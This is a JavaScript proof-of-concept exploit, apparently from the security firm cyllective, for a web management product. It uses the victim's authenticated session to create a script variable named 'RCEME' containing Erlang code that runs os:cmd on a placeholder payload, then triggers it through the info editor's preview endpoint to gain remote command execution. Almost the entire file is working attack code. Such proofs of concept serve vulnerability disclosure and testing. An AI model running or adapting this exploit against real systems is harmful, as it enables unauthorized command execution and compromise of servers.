console.log(`
              ____          __  _
  _______  __/ / /__  _____/ /_(_)   _____
 / ___/ / / / / / _ \\/ ___/ __/ / | / / _ \\
/ /__/ /_/ / / /  __/ /__/ /_/ /| |/ /  __/
\\___/\\__, /_/_/\\___/\\___/\\__/_/ |___/\\___/
    /____/

`);

var parts = window.location.href.split("/");
var baseUrl = parts.slice(0, 4).join("/");

var scriptCreateUrl =
  baseUrl + "/bi_scriptvar?action=create&bi_tag=scriptvars&_dc=1738680358371";

var previewUrl = baseUrl + "/bi_infoeditor?action=read&bi_tag=preview";

var scripVarData = {
  name: "RCEME",
  description: "",
  type: "script",
  scriptvar_default:
    'fun(Data) ->\n    % Formatting a date (Format, Now)\n    Default = FormatDate(<<"d.m.Y">>, Now),\n    \n    % different field types with default value\n    Field = DateField(Default),\n    \n    Command = "PAYLOADHERE",\n    os:cmd(Command),\n\n    % return scriptvar\n    Scriptvar(Field, Data)\nend.\n',
  scriptvar_format: "",
  sorted_list: false,
  _client_id: "scriptvar.Scriptvar-14",
};

var infoData = {
  ldapComboDomain: "",
  doc_editor: "",
  doc_logon: "",
  info_0: "[Scriptvar=RCEME]",
  info_0_caption: "",
  active: 1,
  minutes: 1,
  showonusersdesktop: true,
  cancloseonusersdesktop: true,
  showonwinlogondesktop: true,
  cancloseonwinlogondesktop: true,
  closeonclick: true,
  cancelonclose: true,
  enabled: true,
  quickusersadditional: true,
  manually_answers: ["text"],
  _id: "infoeditor.Info-1",
  doc_parent: "",
  alldays: true,
  day_1: false,
  day_2: false,
  day_3: false,
  day_4: false,
  day_5: false,
  day_6: false,
  day_7: false,
  dayperiod: 1,
  dayperiodcheckedvalue: 1,
  dayperiodeachallvalue: 1,
  dayperiodperiod: 1,
  dayperiodtype: 1,
  dayperiodtypetype: 2,
  isinifile: false,
  cancelall: false,
  cancelallsilent: false,
  channels: "",
  description: "",
  globaltime: false,
  offline: false,
  infinity: false,
  popup: false,
  popupfullscreen: false,
  popupheight: 0,
  popupwidth: 0,
  popupuseie: false,
  beep: false,
  countbeep: 0,
  soundonly: false,
  soundfile: "",
  begindate: "",
  begintime: "",
  enddate: "",
  endtime: "",
  templatename: "",
  bi_templatename: "",
  loudness: false,
  minperiodactive: 1,
  minperiodinterval: 1,
  minperiodstart: -1,
  minperiodstartvalue: 0,
  minperiodvalue: false,
  setclienttime: false,
  quickusersonly: false,
  soundcounttype: 1,
  continue: false,
  utc_time: false,
  info_0_background: "",
  info_0_background_caption: "",
  info_10000: "",
  info_10000_caption: "",
  info_10000_background: "",
  info_10000_background_caption: "",
  info_1: "",
  info_1_caption: "",
  info_1_background: "",
  info_1_background_caption: "",
  info_10001: "",
  info_10001_caption: "",
  info_10001_background: "",
  info_10001_background_caption: "",
  info_2: "",
  info_2_caption: "",
  info_2_background: "",
  info_2_background_caption: "",
  info_10002: "",
  info_10002_caption: "",
  info_10002_background: "",
  info_10002_background_caption: "",
  popupalwaysontop: true,
};

fetch(scriptCreateUrl, {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
  },
  body: JSON.stringify(scripVarData),
})
  .then(() => {
    fetch(previewUrl, {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
      },
      body: JSON.stringify(infoData),
    });
  })
  .catch((error) => console.error("Error:", error));
